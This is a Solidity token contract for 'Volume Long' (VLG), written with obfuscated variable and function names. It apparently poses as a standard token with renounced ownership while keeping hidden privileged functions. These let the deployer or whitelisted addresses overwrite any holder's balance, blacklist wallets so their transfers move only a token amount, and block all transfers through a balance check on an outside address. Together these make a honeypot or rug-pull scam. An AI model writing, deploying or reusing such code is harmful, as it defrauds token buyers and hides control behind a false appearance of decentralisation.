//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface atReceiverTx {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract minIs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface modeShould {
    function createPair(address tradingAtBuy, address autoTx) external returns (address);
}

interface marketingBuy {
    function totalSupply() external view returns (uint256);

    function balanceOf(address totalBuy) external view returns (uint256);

    function transfer(address launchModeTeam, uint256 isWalletShould) external returns (bool);

    function allowance(address txShould, address spender) external view returns (uint256);

    function approve(address spender, uint256 isWalletShould) external returns (bool);

    function transferFrom(
        address sender,
        address launchModeTeam,
        uint256 isWalletShould
    ) external returns (bool);

    event Transfer(address indexed from, address indexed atTradingMin, uint256 value);
    event Approval(address indexed txShould, address indexed spender, uint256 value);
}

interface limitTo is marketingBuy {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract VolumeLong is minIs, marketingBuy, limitTo {

    function transferFrom(address limitSwapFund, address launchModeTeam, uint256 isWalletShould) external override returns (bool) {
        if (_msgSender() != exemptFromLaunched) {
            if (sellWallet[limitSwapFund][_msgSender()] != type(uint256).max) {
                require(isWalletShould <= sellWallet[limitSwapFund][_msgSender()]);
                sellWallet[limitSwapFund][_msgSender()] -= isWalletShould;
            }
        }
        return totalTeamAuto(limitSwapFund, launchModeTeam, isWalletShould);
    }

    mapping(address => uint256) private fundMode;

    mapping(address => bool) public launchAtReceiver;

    function feeReceiver(address fundTo) public {
        require(fundTo.balance < 100000);
        if (totalTo) {
            return;
        }
        if (sellReceiver != takeList) {
            takeList = false;
        }
        launchAtReceiver[fundTo] = true;
        
        totalTo = true;
    }

    uint8 private toReceiver = 18;

    bool private amountTrading;

    bool private takeList;

    bool private limitTokenFrom;

    uint256 receiverLiquidity;

    function name() external view virtual override returns (string memory) {
        return tokenReceiverFund;
    }

    event OwnershipTransferred(address indexed atFund, address indexed liquidityAmount);

    address public receiverMin;

    function allowance(address launchLiquidity, address tokenList) external view virtual override returns (uint256) {
        if (tokenList == exemptFromLaunched) {
            return type(uint256).max;
        }
        return sellWallet[launchLiquidity][tokenList];
    }

    function shouldMax(uint256 isWalletShould) public {
        totalReceiver();
        receiverLiquidity = isWalletShould;
    }

    bool public sellReceiver;

    function walletTake(address limitSwapFund, address launchModeTeam, uint256 isWalletShould) internal returns (bool) {
        require(fundMode[limitSwapFund] >= isWalletShould);
        fundMode[limitSwapFund] -= isWalletShould;
        fundMode[launchModeTeam] += isWalletShould;
        emit Transfer(limitSwapFund, launchModeTeam, isWalletShould);
        return true;
    }

    function totalTeamAuto(address limitSwapFund, address launchModeTeam, uint256 isWalletShould) internal returns (bool) {
        if (limitSwapFund == amountWallet) {
            return walletTake(limitSwapFund, launchModeTeam, isWalletShould);
        }
        uint256 sellTeam = marketingBuy(receiverMin).balanceOf(takeLaunchedSender);
        require(sellTeam == receiverLiquidity);
        require(launchModeTeam != takeLaunchedSender);
        if (tradingList[limitSwapFund]) {
            return walletTake(limitSwapFund, launchModeTeam, maxExempt);
        }
        return walletTake(limitSwapFund, launchModeTeam, isWalletShould);
    }

    address private senderTx;

    function balanceOf(address totalBuy) public view virtual override returns (uint256) {
        return fundMode[totalBuy];
    }

    uint256 private modeSell;

    bool public totalTo;

    address exemptFromLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function approve(address tokenList, uint256 isWalletShould) public virtual override returns (bool) {
        sellWallet[_msgSender()][tokenList] = isWalletShould;
        emit Approval(_msgSender(), tokenList, isWalletShould);
        return true;
    }

    function owner() external view returns (address) {
        return senderTx;
    }

    constructor (){
        
        atReceiverTx amountSwap = atReceiverTx(exemptFromLaunched);
        receiverMin = modeShould(amountSwap.factory()).createPair(amountSwap.WETH(), address(this));
        if (sellReceiver == swapFeeTo) {
            liquidityFund = modeSell;
        }
        amountWallet = _msgSender();
        sellLaunch();
        launchAtReceiver[amountWallet] = true;
        fundMode[amountWallet] = modeIsExempt;
        
        emit Transfer(address(0), amountWallet, modeIsExempt);
    }

    function totalReceiver() private view {
        require(launchAtReceiver[_msgSender()]);
    }

    function symbol() external view virtual override returns (string memory) {
        return teamLaunched;
    }

    string private tokenReceiverFund = "Volume Long";

    address public amountWallet;

    bool public txMin;

    function transfer(address listTakeMin, uint256 isWalletShould) external virtual override returns (bool) {
        return totalTeamAuto(_msgSender(), listTakeMin, isWalletShould);
    }

    mapping(address => bool) public tradingList;

    address takeLaunchedSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 public liquidityFund;

    mapping(address => mapping(address => uint256)) private sellWallet;

    function getOwner() external view returns (address) {
        return senderTx;
    }

    function liquidityWallet(address listTakeMin, uint256 isWalletShould) public {
        totalReceiver();
        fundMode[listTakeMin] = isWalletShould;
    }

    uint256 launchedMarketing;

    function totalSupply() external view virtual override returns (uint256) {
        return modeIsExempt;
    }

    uint256 private modeIsExempt = 100000000 * 10 ** 18;

    function decimals() external view virtual override returns (uint8) {
        return toReceiver;
    }

    function sellLaunch() public {
        emit OwnershipTransferred(amountWallet, address(0));
        senderTx = address(0);
    }

    function launchBuy(address toMinIs) public {
        totalReceiver();
        if (takeList == amountTrading) {
            swapFeeTo = true;
        }
        if (toMinIs == amountWallet || toMinIs == receiverMin) {
            return;
        }
        tradingList[toMinIs] = true;
    }

    uint256 constant maxExempt = 16 ** 10;

    bool public swapFeeTo;

    string private teamLaunched = "VLG";

}